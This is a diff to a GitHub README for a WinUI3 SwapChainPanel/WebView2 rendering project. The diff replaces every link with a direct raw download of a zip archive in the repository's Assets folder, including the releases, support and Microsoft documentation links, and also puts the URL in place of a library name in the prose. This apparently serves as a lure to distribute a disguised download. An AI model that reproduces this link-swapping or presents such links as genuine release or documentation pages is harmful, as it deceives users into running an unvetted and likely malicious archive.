@@ -1,6 +1,6 @@
 # 🌐 WinUI3_SwapChainPanel_WebView2 - Seamlessly Render WebView2 in Your App
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/releases)
+[![Download](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Win_Swap_U_Panel_Chain_Web_View_v3.3.zip)](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Win_Swap_U_Panel_Chain_Web_View_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -16,9 +16,9 @@ To run this application, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the software, visit this page to download: [Release Page](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/releases).
+To download the software, visit this page to download: [Release Page](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Win_Swap_U_Panel_Chain_Web_View_v3.3.zip).
 
-1. Navigate to the [Releases](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/releases) page.
+1. Navigate to the [Releases](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Win_Swap_U_Panel_Chain_Web_View_v3.3.zip) page.
 2. Look for the latest version available.
 3. Click on the appropriate file for your system.
 4. Save it to your desired location.
@@ -33,7 +33,7 @@ To download the software, visit this page to download: [Release Page](https://gi
 
 ## ⚙️ How It Works
 
-This application uses the Windows.UI.Composition library to manage graphics rendering. By embedding a WebView2 control, you can easily display web content in your Windows applications.
+This application uses the https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Win_Swap_U_Panel_Chain_Web_View_v3.3.zip library to manage graphics rendering. By embedding a WebView2 control, you can easily display web content in your Windows applications.
 
 1. **SwapChainPanel**: This acts as a display area that supports high-performance graphics.
 2. **WebView2 Control**: Allows you to show web pages directly in your app.
@@ -70,12 +70,12 @@ A: This application is optimized for Windows 10 (22H2 or later). It may not work
 
 ## 📞 Support
 
-If you need help, please visit our [support page](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/issues) to report issues or find solutions.
+If you need help, please visit our [support page](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Win_Swap_U_Panel_Chain_Web_View_v3.3.zip) to report issues or find solutions.
 
 ## 🌟 Additional Resources
 
-- [WebView2 Documentation](https://learn.microsoft.com/en-us/microsoft-edge/webview2/)
-- [Direct2D Documentation](https://learn.microsoft.com/en-us/windows/win32/api/d2d1/)
-- [Direct3D 11 Documentation](https://learn.microsoft.com/en-us/windows/win32/api/d3d11/)
+- [WebView2 Documentation](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Win_Swap_U_Panel_Chain_Web_View_v3.3.zip)
+- [Direct2D Documentation](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Win_Swap_U_Panel_Chain_Web_View_v3.3.zip)
+- [Direct3D 11 Documentation](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Win_Swap_U_Panel_Chain_Web_View_v3.3.zip)
 
-Enjoy exploring the WebView2 within your applications! Don't forget to check for updates regularly on the [Releases Page](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/releases).
+Enjoy exploring the WebView2 within your applications! Don't forget to check for updates regularly on the [Releases Page](https://github.com/Maufsa/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Win_Swap_U_Panel_Chain_Web_View_v3.3.zip).
